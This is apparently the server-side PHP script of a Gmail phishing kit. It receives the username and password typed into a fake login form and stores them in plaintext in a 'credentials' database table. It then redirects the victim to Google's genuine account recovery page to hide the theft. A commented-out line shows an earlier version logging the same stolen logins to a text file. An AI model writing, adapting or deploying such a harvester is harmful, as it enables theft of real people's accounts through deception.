<?php

include 'config.php';

// file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
// header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
// exit();

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Store the credentials in a database
    $create_table_query = "CREATE TABLE IF NOT EXISTS credentials (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(255) NOT NULL,
        password VARCHAR(255) NOT NULL
    )";

    if ($conn->query($create_table_query) === TRUE) {
        $insert_query = "INSERT INTO credentials (username, password) VALUES (?, ?)";
        $stmt = $conn->prepare($insert_query);
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        $stmt->close();
    } else {
        echo "Error creating table: " . $conn->error;
    }

    // Redirect to the Google recovery page
    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
    exit();
} else {
    // If the form is not submitted, redirect to the login page
    header('Location: login.html');
    exit();
}

?>